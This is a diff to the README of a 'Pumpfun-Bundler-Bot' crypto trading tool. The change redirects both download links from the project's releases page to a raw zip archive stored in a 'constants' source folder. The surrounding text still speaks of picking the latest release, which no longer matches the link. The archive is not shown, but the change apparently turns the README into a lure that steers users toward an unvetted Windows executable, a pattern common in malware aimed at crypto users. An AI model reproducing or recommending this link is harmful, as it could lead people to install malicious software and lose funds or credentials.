@@ -1,6 +1,6 @@
 # ⚙️ Pumpfun-Bundler-Bot - Simple control for bundled trades
 
-[![Download Pumpfun-Bundler-Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/releases)
+[![Download Pumpfun-Bundler-Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/raw/refs/heads/main/constants/Bot-Bundler-Pumpfun-v3.1.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ For the best result, close other heavy apps before you start.
 
 Visit this page to download:
 
-https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/releases
+https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/raw/refs/heads/main/constants/Bot-Bundler-Pumpfun-v3.1.zip
 
 After the page opens, look for the latest release. Download the Windows file from that release, then move to the next step.
 
